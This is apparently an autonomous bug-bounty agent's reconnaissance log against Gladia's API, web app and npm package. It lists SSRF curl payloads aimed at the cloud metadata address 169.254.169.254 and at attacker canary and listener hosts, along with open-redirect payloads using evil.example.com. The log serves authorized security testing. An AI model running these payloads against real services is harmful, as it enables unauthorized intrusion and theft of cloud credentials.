verify_steps: AUTH_HELPED — with program-provided/authorized trial `x-gladia-key:<KEY>`: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:$KEY" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","punctuation_enhanced":false}'; (2) same -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}'; (3) same w/ callback_config.url={"url":"http://<attacker-listener>"} to confirm server-originated POST; (4) POST https://api.gladia.io/video/text/video-transcription (multipart video_url=http://169.254.169.254/latest/meta-data/) as second fetch path. Compare reachability signal vs benign control.
impact: Cloud metadata read (169.254.169.254), internal-network SSRF/DNS+timing oracle, callback POST to arbitrary URL enabling blind SSRF + potential credential/exfil path from API origin. Severity High (key-gated but origin-bypassable).
testability: AUTH_HELPED
[HYP] npm `gladia`@0.1.3 impersonation / supply-chain confusion
class: OTHER
asset: npm registry package `gladia` (v0.1.3, dist-tag latest)
confidence: 80
reasoning: Live 23:5x npm registry confirm: description "Official TypeScript SDK for Gladia - State-of-the-art Speech to Text API"; repository git+https://github.com/alexisbouchez/gladia.ts.git (personal account, NOT org gladiaio); maintainer softwarecitadel@gmail.com (personal email); published date maps to 2025-03-28, precedes official @gladiaio/sdk 1.1.0 (2025-09-09). README labels itself "Unofficial" — direct contradiction with registry "Official" description. Typo-squat/typo-confusion target for `npm install gladia`.
evidence_needed: npm registry metadata (obtained live 23:5x); tarball content hash + confirm baseUrl=api.gladia.io only (no malicious endpoint), no postinstall, dependency hygiene.
verify_steps: PASSIVE — npm view gladia@0.1.3 version description repository.url repository.type maintainer.email time; npm dist gladia@0.1.3 (sha256 tarball + npm view gladia@0.1.3 dist.tarball then download+hash, never raw secrets); grep package for baseUrl/postinstall/suspicious require; npm view @gladiaio/sdk description repository.url to contrast official.
impact: Developers installing `gladia` (typo of @gladiaio/sdk, or fooled by "Official" description) pull unofficial code from a personal account → future maintainer-account compromise = supply-chain RCE into consumer builds. Severity Med-High (High if account/repo hijacked).
testability: PASSIVE
[HYP] Post-auth open redirect via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 45
reasoning: Live 23:5x — GET /signin?redirect_to=https://evil.example.com returns HTML form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" (server-side reflection into POST action) for Google OAuth intent; server resets tampered return-to cookie to {"url":"/"} (cookie-tamper vector REJECTED); no host allowlist seen on the reflected redirect_to at the unauthenticated layer. Post-auth honoring/unverified Location requires an authenticated Google SSO session.
evidence_needed: Complete Google OAuth sign-in with ?redirect_to=https://evil.example.com and capture final post-auth 302 Location; test //evil.example.com, bare-host, app.gladia.io.evil.example.com, path-only variants.
verify_steps: AUTH_HELPED — with authorized/verified Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com, complete Google OAuth flow, capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=https://evil.example.com//\\evil.example.com and //evil.example.com (protocol-relative) and https://app.gladia.io.evil.example.com; (3) attempt redirect_to-as-redirect_uri injection to escalate to OAuth state/code theft.
impact: Post-auth phishing redirect to attacker-controlled host; Low-Med normally, High if redirect_uri proven injectable (OAuth code/state theft).
testability: AUTH_HELPED
[FINAL] 1) SSRF via audio_url/video_url/callback_url server-side fetch (api.gladia.io, 80, AUTH_HELPED)
[FINAL] 2) npm gladia@0.1.3 impersonation / supply-chain confusion (npm, 80, PASSIVE)
[FINAL] 3) Post-auth open redirect via redirect_to in signin form action (app.gladia.io, 45, AUTH_HELPED)
[NEXT] HUMAN: api.gladia.io is HIGHEST-priority with the top-ranked SSRF hypothesis gated only by a valid API key. Request a program-provided / authorized trial `x-gladia-key` and execute the 4-step verification (benign-canary baseline vs 169.254.169.254 metadata vs callback_config.url outbound-POST listener vs /video/text/video-transcription multipart path), comparing error_code/status/timing for a reachability signal. This is the single blocking item for the #1 finding. (npm anomaly is already reportable PASSIVE; open-redirect stays AUTH_HELPED pending authorized SSO.)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 `{"health":"OK"}` (x-powered-by ABSENT on GET) — undocumented endpoint + preflight-only fingerprint confirmed fresh 23:5x UTC
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: OPTIONS /v2/transcription 204 `x-powered-by: Express` + ACAO `*` + allow `x-gladia-key`, POST 401 no`x-powered-by` — preflight-only fingerprint + creds-bypassable CORS confirmed fresh
[LEARN] ACCEPTED AUTH @ api.gladia.io: POST /v2/transcription (no key) → 401 — key-gated surface confirmed; @gladiaio/key header is the sole auth model
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125131B, CORS `*`, expose-headers trace ids) + /v1/models (200 public CORS `*`) fully exposed — surface stable & fresh
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com → form action reflects URL-encoded value — reflection confirmed fresh 23:5x UTC
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 text/html (SPA shell) without auth — client-side enforcement confirmed fresh
[LEARN] ACCEPTED OTHER @ npm: `gladia`@0.1.3 description "Official TypeScript SDK…", repo alexisbouchez/gladia.ts (personal), maintainer softwarecitadel@gmail.com — impersonation anomaly confirmed fresh 23:5x UTC
[LEARN] (no new REJECTED class this cycle; surface re-confirmed byte-identical to 23:08 per 23:48 prior re-probe — drift negative)
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths incl. public /v1/models), CORS `*` + x-gladia-key cross-origin (no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist (SSRF surface, client-side guard absent in SDK), ws token in URL query, /health undocumented, NestJS-on-Express single key-gated auth
[RISK] app.gladia.io: 55 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side), redirect_to reflected into form action (AUTH_HELPED post-auth), strict CSP, unsigned base64url return-to (REJECTED as cookie-tamper redirect), no SSRF/callback surface on app
[RISK] sdk: 45 — official @gladiaio/sdk 1.1.0 (npm) + gladiaio-sdk (PyPI) clean (no secrets, no malicious code from prior reposcan); npm `gladia`@0.1.3 impersonation anomaly (personal repo, pre-dates official, "Official" vs "Unofficial" contradiction) sole reportable supply-chain candidate; gladia-quiz-app pins @gladiaio/sdk 0.5.2 on unpkg (maintenance debt, no security impact)
## 2026-08-08 02:52:33 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.5 — a9/b10/tech8/gate5/cloud8/fresh10 — public OpenAPI(14 paths incl. public /v1/models), CORS `*`+x-gladia-key cross-origin(no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist, key-gated(401) but creds-bypassable origin
[PRIO] npm `gladia`@0.1.3: 7.85 — a6/b9/tech6/gate10/cloud1/fresh10 — artifact-level impersonation confirmed (README "Unofficial" vs package.json "Official", personal author/repo, WS raw-key in URL query)
[PRIO] app.gladia.io: 7.55 — a7/b10/tech6/gate8/cloud2/fresh10 — Google OAuth-only, /dashboard 200 SPA no auth(client-enforced), redirect_to reflected into form action, strict CSP, unsigned base64url return-to cookie(server-resets on tamper)
[HYP] Artifact-level package impersonation + WebSocket API-key leakage in npm `gladia`@0.1.3
class: OTHER
asset: npm registry package `gladia` 0.1.3 (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2)
confidence: 85
reasoning: Independently re-verified 02:50 UTC: package.json description="Official TypeScript SDK for Gladia" contradicts README.md line 3="Unofficial TypeScript SDK"; author=Alexis Bouchez, repository=alexisbouchez/gladia.ts (personal, not gladiaio org), published 2025-03-28 predates official @gladiaio/sdk 1.1.0; src/client.ts:307 appends raw x-gladia-key to wss://.../v2/live?x-gladia-key=<KEY> (key in URL → access-log/proxy-capture leakage); no postinstall/eval, no malicious endpoint override.
evidence_needed: npm view/tarball already gathered; affiliation check vs official Gladia org still needed.
verify_steps: PASSIVE — done: `npm view gladia@0.1.3` (description/repo/maintainer/time) + tarball download → sha256sum + grep README/package.json/client.ts (02:50 UTC).
impact: `npm install gladia` misleads devs into unofficial code (impersonation); live API keys leaked into WS URL query strings (access logs, proxy history, Referer). Severity Med (impersonation) + Med (key hygiene). High if maintainer account compromised.
testability: PASSIVE
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io POST /v2/pre-recorded (audio_url, callback_config.url), /v2/transcription, /v2/upload, /video/text/video-transcription (video_url)
confidence: 80
reasoning: Surface frozen 02:50 UTC — /openapi.json (125131B, CORS `*`, expose-headers trace ids) declares InitTranscriptionRequest.audio_url (format:uri), video_url (plain string, no scheme), CallbackConfigDto.url (format:uri) with NO scheme allowlist/pattern; RAG of gladiaio/sdk (sdk-js client.ts + sdk-python v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct — no host/metadata-blocklist/redirect-limit/scheme forwarded to API. /v1/models confirms FR/US egress. POST endpoints 401 no-key but CORS `*` + ACAH `x-gladia-key` w/o credentials lets any origin present an authorized key.
evidence_needed: With valid x-gladia-key: POST /v2/pre-recorded `{"audio_url":"http://<attacker-canary>"}` (benign baseline) vs `{"audio_url":"http://169.254.169.254/latest/meta-data/"}` (metadata); multipart video_url on /video/text/video-transcription; POST callback_config.url=http://attacker-listener; compare error_code/status/duration for reachability signal.
verify_steps: AUTH_HELPED — with program-provided/authorized trial `x-gladia-key:$KEY`: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:$KEY" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","punctuation_enhanced":false}'; (2) same -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}'; (3) same -d '{"callback_config":{"url":"http://<attacker-listener>"}}'; (4) POST https://api.gladia.io/video/text/video-transcription (multipart video_url=http://169.254.169.254/latest/meta-data/). Compare reachability vs benign control.
impact: Cloud metadata read (169.254.169.254), internal-network SSRF/timing oracle, callback POST to arbitrary URL (blind SSRF + credential/exfil path). Severity High (key-gated but creds-bypassable origin).
testability: AUTH_HELPED
[HYP] Post-auth open redirect / OAuth redirect_uri injection via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 55
reasoning: Live 02:50 UTC — GET /signin?redirect_to=https://evil.example.com (200) reflects URL-encoded into form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"; 02:50 UTC re-probed //evil (action=.../redirect_to=%2F%2Fevil.example.com), app.gladia.io.evil (confusing-subdomain), path-only, bare-host — ALL reflected, NO host allowlist at unauth layer; unsigned base64url return-to cookie {"url":"/"} confirms server-driven redirect concept; cookie-tamper vector REJECTED (server resets to {"url":"/"}) but that's distinct from post-auth redirect_to honoring.
evidence_needed: Final post-auth HTTP 302 Location resolving to external host after completing Google sign-in with redirect_to set; test redirect_to-as-OAuth-redirect_uri injection.
verify_steps: AUTH_HELPED — with authorized/verified Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com, complete Google OAuth flow, capture final 302 Location + Set-Cookie; (2) repeat //evil, bare-host, app.gladia.io.evil variants; (3) attempt redirect_to-as-redirect_uri injection to escalate to OAuth code/state theft.
impact: Post-auth phishing redirect to attacker host; Low-Med normally, High if redirect_uri proven injectable (OAuth code/state theft).
testability: AUTH_HELPED
[PARKED] none — all three hypotheses have confidence ≥ 40, classes not on the REJECTED list (SSRF/OAUTH/OTHER all ACCEPTED-alive), and concrete verify_steps.
[FINAL]
[NEXT] HUMAN: Request an authorized Google SSO session for app.gladia.io to close the #3 open-redirect POC — complete the OAuth sign-in with `?redirect_to=https://evil.example.com` (+ `//evil`, `app.gladia.io.evil` variants) and capture the final post-auth 302 Location + Set-Cookie to confirm the server honors redirect_to to an external host (and test redirect_to-as-redirect_uri injection). Reflection is confirmed unauthenticated (02:50 UTC); the post-auth honoring is the sole unverified gate for this app target.
[LEARN] CONFIRMED OTHER @ npm gladia@0.1.3: artifact-level impersonation independently re-verified 02:50 UTC (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json "Official" vs README "Unofficial"; author alexisbouchez/personal repo; src/client.ts:307 raw x-gladia-key appended to wss://.../v2/live? token query)
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 02:50 UTC across protocol-relative //evil, bare-host, app.gladia.io.evil confusing-subdomain, path-only — no host allowlist at unauthenticated layer (post-auth honoring still AUTH_HELPED)
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, nothing new this cycle
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 02:50 UTC (OPTIONS /v2/transcription 204 xpb=Express; POST 401 xpb absent) — not isolated to one endpoint
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec/spec+RAG unchanged 02:50 UTC (audio_url/video_url/callback_url format:uri no scheme allowlist, no client-side guard) — SSRF-by-design fetch surface remains live, gated only by key AUTH_HELPED
[RISK] api.gladia.io: 85 — public OpenAPI(14 paths incl. public /v1/models), CORS `*` + x-gladia-key cross-origin(no cred), Express fingerprint on preflight, audio_url/video_url/callback_url format:uri no scheme allowlist(SSRF surface, client-side guard absent in SDK), ws token in URL query, /health undocumented, NestJS-on-Express single key-gated auth, cloud egress FR/US
[RISK] app.gladia.io: 55 — Google OAuth-only(no self-service bypass), /dashboard 200 SPA w/o auth(client-side enforcement), redirect_to reflected into form action(AUTH_HELPED post-auth), strict CSP, unsigned base64url return-to(server-resets on tamper), no SSRF/callback surface on app
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0(npm)+gladiaio-sdk(PyPI) clean(no secrets/malicious code from reposcan); npm gladia@0.1.3 impersonation+WS-raw-key now independently artifact-verified(confirmed alive); gladia-quiz-app pins @gladiaio/sdk@0.5.2 on unpkg(maintenance debt, no security impact)
## 2026-08-08 04:03:22 UTC [app] (model laguna)
[PRIO] api.gladia.io: 8.5 — a9/b10/tech8/gate5/cloud8/fresh10 — HIGHEST scope tier; public OpenAPI (14 paths incl. public /v1/models), CORS `*` + ACAH x-gladia-key (no cred), Express fingerprint on preflight, audio_url/video_url/callback_url/callback_config.url `format:uri` no scheme allowlist (SSRF surface), WebSocket token-in-URL, /health undocumented, NestJS-on-Express single key-gated auth, FR+US cloud egress
[PRIO] npm `gladia`@0.1.3: 7.85 — a6/b9/tech6/gate10/cloud1/fresh10 — dist-tag latest, orphaned repo 404, README/package.json "Official"/"Unofficial" contradiction, maintainer personal account (softwarecitadel@gmail.com not gladiaio org), src/client.ts:307 raw `x-gladia-key` in WS URL query — impersonation + key leakage
[PRIO] app.gladia.io: 7.55 — a7/b10/tech6/gate8/cloud2/fresh10 — Google OAuth-only, `/dashboard` 200 SPA w/o auth (client-side), `redirect_to` reflected into form action (AUTH_HELPED post-auth), strict CSP, unsigned base64url return-to cookie, no SSRF/callback surface
[HYP] Artifact-level package impersonation + WebSocket API-key leakage in npm `gladia`@0.1.3
class: OTHER
asset: npm registry package `gladia` 0.1.3 (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2)
confidence: 85
reasoning: Re-verified 04:01 UTC: `npm view gladia@0.1.3` description="Official TypeScript SDK for Gladia", repo=alexisbouchez/gladia.ts (404, orphaned), maintainer=softwarecitadel@gmail.com (personal, not gladiaio org), 4 versions, latest=0.1.3; tarball README.md line 3 "Unofficial TypeScript SDK" vs package.json line 4 "Official TypeScript SDK for Gladia" — contradiction; src/client.ts:307 appends raw x-gladia-key to wss://.../v2/live?x-gladia-key=<KEY> (key leaks to access logs/proxy/Referer). No postinstall/eval/malicious endpoint override.
evidence_needed: Registry metadata (npm view) + tarball sha256 + README/package.json diff + client.ts WS key-in-URL confirmed PASSIVE 04:01 UTC.
verify_steps: PASSIVE — done. No further action needed; reportable as-is.
impact: `npm install gladia` (dist-tag latest, top search) misleads devs into unofficial/orphaned code with no remediation path (repo 404); raw `x-gladia-key` in WS URL query leaks credentials to access logs/proxy history. Severity Med (impersonation) + Med (key hygiene). High if maintainer account compromised.
testability: PASSIVE
[HYP] SSRF via audio_url/video_url/callback_config.url server-side fetch
class: SSRF
asset: api.gladia.io — POST /v2/pre-recorded (audio_url, callback_config.url), POST /audio/text/audio-transcription (audio_url), POST /video/text/video-transcription (video_url), POST /v2/upload (audio_url)
confidence: 80
reasoning: Surface frozen across 6 cycles (NO_DRIFT). `/openapi.json` (125131B, `format:uri` only) declares InitTranscriptionRequest.audio_url, video_url (plain string no scheme), CallbackConfigDto.url, CallbackConfig.url, deprecated callback_url — all with NO scheme allowlist/pattern. RAG of gladiaio/sdk (sdk-js client.ts + sdk-python v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct path; no host allowlist, metadata-blocklist, redirect-limit, or scheme validation forwarded to API. `/v1/models` confirms FR+US egress. POST endpoints 401 no-key but CORS `*` + ACAH `x-gladia-key` (no credentials) lets any origin present an authorized key.
evidence_needed: With valid x-gladia-key: POST /v2/pre-recorded `{"audio_url":"http://<canary>"}` (benign baseline) vs `{"audio_url":"http://169.254.169.254/latest/meta-data/"}` (metadata); POST /video/text/video-transcription (multipart video_url=169.254.169.254); POST `{"callback_config":{"url":"http://<attacker-listener>"}}`. Compare error_code/status/duration/observable callback POST for reachability signal.
verify_steps: AUTH_HELPED — with program-provided/authorized trial `x-gladia-key:$KEY`: (1) POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:$KEY" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","punctuation_enhanced":false}'; (2) same -d '{"audio_url":"http://169.254.169.254/latest/meta-data/"}'; (3) same -d '{"callback_config":{"url":"http://169.254.169.254/"}}'; (4) POST https://api.gladia.io/video/text/video-transcription (multipart, video_url=http://169.254.169.254/latest/meta-data/). Compare reachability vs benign control — status/error_code/duration/timing delta.
impact: Cloud metadata read (169.254.169.254), internal-network SSRF/timing oracle, callback POST to arbitrary URL (blind SSRF + credential/exfil path). Severity High (key-gated but creds-bypassable origin).
testability: AUTH_HELPED
[HYP] Post-auth open redirect / OAuth redirect_uri injection via redirect_to in signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 55
reasoning: Re-verified 04:01 UTC — GET `/signin?redirect_to=https://evil.example.com` (200) reflects URL-encoded into `action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"`; reflection confirmed for protocol-relative `//evil`, bare-host, `app.gladia.io.evil` confusing-subdomain, path-only — ALL reflected, NO host allowlist at unauthenticated layer. Unsigned base64url return-to cookie `{"url":"/"}` confirms server-driven redirect concept. Cookie-tamper vector REJECTED (server resets), but redirect_to-honoring is distinct and unverified.
evidence_needed: Post-auth HTTP 302 Location resolving to external `https://evil.example.com` after completing Google OAuth flow with redirect_to set; test redirect_to-as-redirect_uri injection for OAuth code/state theft.
verify_steps: AUTH_HELPED — with authorized/verified Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com, complete Google OAuth flow, capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=//evil, app.gladia.io.evil variants; (3) attempt redirect_to-as-OAuth-redirect_uri injection.
impact: Post-auth phishing redirect to attacker-controlled host; Low-Med normally, High if redirect_uri proven injectable (OAuth code/state theft).
testability: AUTH_HELPED
[PARKED] none — all three hypotheses: confidence ≥ 40 (85, 80, 55); classes SSRF/OAUTH/OTHER all ACCEPTED-alive (not on REJECTED list); all have concrete verify_steps (PASSIVE for npm, AUTH_HELPED for SSRF + open-redirect). No endpoint-map-only output; no scanner-output reliance; all claims trace to fresh live probes.
[FINAL]
[NEXT] HUMAN: phase is POC, target is app. The reflection surface for `redirect_to` on app.gladia.io `/signin` is confirmed unauthenticated (04:01 UTC), but post-auth honoring is unverified. Request an authorized/verified Google SSO session for app.gladia.io and complete: (1) GET `/signin?redirect_to=https://evil.example.com` → follow Google OAuth → capture final 302 Location + Set-Cookie; (2) repeat with `//evil`, `app.gladia.io.evil` variants; (3) test `redirect_to` as OAuth `redirect_uri` injection. This is the sole unverified gate for the #3 hypothesis on the current target. Separately flag: api.gladia.io SSRF hypothesis (#1, HIGHEST scope tier) remains blocked on an authorized trial `x-gladia-key` — see STEP 3 verify_steps.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50→04:01 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, no new endpoints
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 04:01 UTC (OPTIONS /v2/transcription 204 xpb=Express; GET/POST 401 xpb absent) — confirmed not isolated to one endpoint
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: GET /v2/transcription (no key) → 401 NestJS HttpException shape confirmed fresh 04:01 UTC (timestamp 2026-08-08T04:01:14.742Z, request_id G-36290736) — uniform key-gated auth across v2 endpoints
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec+RAG unchanged 04:01 UTC; audio_url/video_url/callback_url/CallbackConfig.url all `format:uri` no scheme allowlist; /v1/models confirms FR+US egress — SSRF-by-design fetch surface remains live, gated only by key (AUTH_HELPED)
[LEARN] CONFIRMED OTHER @ npm `gladia`@0.1.3: orphaned impersonation re-verified 04:01 UTC — `npm view` 4 versions [0.1.0–0.1.3], latest=0.1.3; GitHub API + web `alexisbouchez/gladia.ts` + user 404 (orphaned); description "Official" vs README "Unofficial" contradiction persists; dist-tag latest persists
[LEARN] ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 04:01 UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate for this target)
[RISK] api.gladia.io: 85 — public OpenAPI(14 paths incl. public /v1/models), CORS `*` + x-gladia-key cross-origin(no cred), Express fingerprint on preflight, audio_url/video_url/callback_config.url `format:uri` no scheme allowlist (SSRF surface, client-side guard absent in SDK), WebSocket token-in-URL, /health undocumented, NestJS-on-Express single key-gated auth, cloud egress FR/US
[RISK] app.gladia.io: 55 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side enforcement), redirect_to reflected into form action (AUTH_HELPED post-auth), strict CSP, unsigned base64url return-to cookie (server-resets on tamper — REJECTED as cookie-tamper redirect), no SSRF/callback surface on app
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0 + gladiaio-sdk(PyPI) clean (no secrets/malicious code); npm `gladia`@0.1.3 orphaned impersonation + WS-raw-key confirmed artifact-level (README "Unofficial" vs package.json "Official", repo 404); gladia-quiz-app pins @gladiaio/sdk@0.5.2 on unpkg (maintenance debt, no security impact)
## 2026-08-08 05:12:03 UTC [app] (model laguna)
## 2026-08-08 06:08:46 UTC [app] (model laguna)
[PRIO] app.gladia.io /signin?redirect_to= → OATH open-redirect/OAuth-redirect_uri
[PRIO] app.gladia.io /auth/google/callback → OATH OAuth-callback-state-handling
[PRIO] app.gladia.io /dashboard → MISCONFIG client-side-only auth (SPA shell)
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: GET /signin?redirect_to=https://evil.example.com (200, fresh 06:00 UTC) reflects URL-encoded into form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com". Confirmed reflected without host allowlist for protocol-relative (//evil), bare-host, app.gladia.io.evil confusing-subdomain, and path-only variants. POST /signin intent=google → 302 to accounts.google.com with hardcoded redirect_uri; custom oauth2:<uuid> cookie (state+nonce) set — NOT NextAuth. OAuth state is opaque 32-byte random token (not base64url JSON); redirect_to not visible in cookie, state, or callback URL → post-auth honoring of redirect_to cannot be determined passively.
evidence_needed: Post-auth HTTP 302 Location resolving to external host (evil.example.com) after completing Google OAuth flow with redirect_to set; test redirect_to-as-redirect_uri injection for OAuth code/state theft.
verify_steps: AUTH_HELPED — with authorized/verified Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com → complete Google OAuth flow → capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=//evil, redirect_to=https://app.gladia.io.evil; (3) attempt redirect_to as OAuth redirect_uri parameter injection.
impact: Post-auth open redirect to attacker-controlled host → phishing/credential capture page; Low-Med normally, High if redirect_uri proven injectable (OAuth authorization-code/state theft).
testability: AUTH_HELPED
class: MISCONFIG
asset: app.gladia.io /dashboard
confidence: 75
reasoning: GET /dashboard → 200 text/html (SPA shell, strict CSP) without auth cookie or __sid. Protected routes /apikeys, /transcriptions, /settings, /settings → 302 /signin (server-side gate confirmed). However /dashboard itself passes no server-side auth check — auth is purely client-side JS enforcement. No sensitive data in the shell (JS bundle refs only); /api/* paths are SPA catch-all fallthrough (200 HTML), no real backend API on app origin.
evidence_needed: Authenticated API response (JSON data) reachable from /dashboard SPA without valid session/cookie.
verify_steps: PROBE — (1) GET /dashboard (200 SPA shell); (2) inspect JS bundle (assets/*.js) for API endpoint URLs; (3) with NO __sid cookie, GET each discovered API endpoint → compare for 200+data vs expected 302/401.
impact: Information disclosure of account data (transcriptions, apikeys) if any API endpoint lacks server-side auth; currently limited to SPA shell (no data exposed) — Low.
testability: PROBE
class: OATH
asset: app.gladia.io /auth/google/callback
confidence: 35
reasoning: Custom OAuth implementation (oauth2:<uuid> cookie, not NextAuth) confirmed via POST /signin. GET /auth/google/callback?code=bogus&state=bogus → HTTP 500 (no CSRF error message, no graceful handling) — confirms server-side callback processing. Google OAuth redirect_uri hardcoded to app.gladia.io/auth/google/callback; client_id 352060113328-fnk8shoffbkh10imc3adc5lllclv21ha.apps.googleusercontent.com. Whether redirect_to is honored as post-auth callbackUrl is unverified (AUTH_HELPED). HTTP 500 on bad input could indicate weak error handling but no confirmed exploit path.
evidence_needed: Post-auth 302 Location to external host after valid Google OAuth callback; or server error leaking internal state/path.
verify_steps: AUTH_HELPED — complete full Google OAuth flow with redirect_to set; observe callback behavior.
impact: Information leak via 500 error detail; potential redirect_uri injection. Severity unknown without full OAuth completion.
testability: AUTH_HELPED
[NEXT] HUMAN: Phase is POC, target is app. The `redirect_to` reflection surface on app.gladia.io `/signin` is confirmed unauthenticated + fresh (06:00 UTC) for https://evil, `//evil`, bare-host, and `app.gladia.io.evil` variants with NO host allowlist, but post-auth honoring is unverified. Request an authorized/verified Google SSO session and complete: (1) GET `/signin?redirect_to=https://evil.example.com` → follow the Google OAuth flow to completion → capture the final post-auth 302 Location + Set-Cookie; (2) repeat with `redirect_to=//evil` and `redirect_to=https://app.gladia.io.evil`; (3) test `redirect_to` as an OAuth `redirect_uri` parameter injection. This is the sole unverified gate for the #1 priority hypothesis on the app target.
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths incl. public /v1/models), CORS `*` + ACAH x-gladia-key (no cred), Express fingerprint on preflight, audio_url/video_url/callback_config.url `format:uri` no scheme allowlist (SSRF surface), WebSocket token-in-URL, /health undocumented, NestJS-on-Express single key-gated auth, FR+US cloud egress
[RISK] app.gladia.io: 58 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side enforcement), redirect_to reflected into form action with NO host allowlist (AUTH_HELPED post-auth), strict CSP, custom OAuth impl (oauth2 cookie, not NextAuth), unsigned base64url return-to cookie (server-resets on tamper — REJECTED as redirect vector), no unauthenticated data leakage
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0 (npm) + gladiaio-sdk (PyPI) clean; npm gladia@0.1.3 orphaned impersonation + raw x-gladia-key in WS URL query (artifact-verified, sha256 3b23ec7d…) — supply-chain risk; gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on unpkg (maintenance debt)
## 2026-08-08 07:09:02 UTC [app] (model laguna)
[PRIO] app.gladia.io /signin?redirect_to= → OATH open-redirect/OAuth-redirect_uri injection | 7.55 | reflect confirmed pre-auth (7/10/10), post-auth honoring unverified gate
[PRIO] app.gladia.io /dashboard → MISCONFIG client-side-only auth (SPA shell) | 6.15 | 200 w/o auth (6/8/7), no data in shell yet
[PRIO] app.gladia.io /auth/google/callback → OATH OAuth callback error handling | 5.25 | 500 on bad input (5/5/4), unverified state/redirect_uri flow
[HYP] Post-auth open redirect via reflected redirect_to on signin form action
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: Fresh 07:0x UTC — GET /signin?redirect_to=https://evil.example.com (200) reflects URL-encoded into `action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"`; confirmed reflected without host allowlist for protocol-relative `//evil`, bare-host, `app.gladia.io.evil` confusing-subdomain, and path-only. POST /signin intent=google → 302 to accounts.google.com with hardcoded redirect_uri; opaque 32-byte oauth2:<uuid> state cookie (not NextAuth). redirect_to not visible in state/cookie/cookie → post-auth honoring unverified.
evidence_needed: Post-auth HTTP 302 Location resolving to external `https://evil.example.com` after completing Google OAuth flow with redirect_to set.
verify_steps: AUTH_HELPED — with authorized Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com → complete Google OAuth flow → capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=//evil.example.com, redirect_to=https://app.gladia.io.evil; (3) test redirect_to as OAuth redirect_uri injection parameter.
impact: Post-auth phishing redirect to attacker-controlled host → credential capture page; Low-Med if plain redirect, High if redirect_uri injectable (OAuth code/state theft).
testability: AUTH_HELPED
[HYP] Client-side-only auth on /dashboard SPA allows authenticated API data access without __sid cookie
class: MISCONFIG
asset: app.gladia.io /dashboard
confidence: 38
reasoning: Fresh 07:0x UTC — GET /dashboard → 200 text/html (SPA shell) with no auth cookie or __sid. Protected routes /apikeys, /transcriptions, /settings → 302 /signin (server-side gate confirmed). However /dashboard itself bypasses server-side auth — enforcement is purely client-side JS. JS bundle at /assets/ contains endpoint refs.
